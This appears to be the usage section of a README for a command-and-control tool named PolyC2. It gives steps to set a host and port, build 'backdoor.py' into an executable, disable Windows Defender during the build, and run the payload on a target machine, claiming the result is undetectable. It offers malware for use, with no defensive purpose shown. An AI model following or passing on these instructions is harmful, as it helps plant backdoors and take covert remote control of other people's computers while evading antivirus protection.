**How to use?**



```
1. edit the host and the port in the config.py



2. install the requirements.txt using "pip3 install -r requirements.txt"


3. and then "build" the backdoor.py using pyinstaller or nuitka
NOTE: if you are building on windows 11, windows 11 defender might detect and prevent the building process, so it is adviced that you stop windows defender, however the payload generated will still be undetectable



4. start the PolyC2.py on your machine and execute the payload on the target machine
```
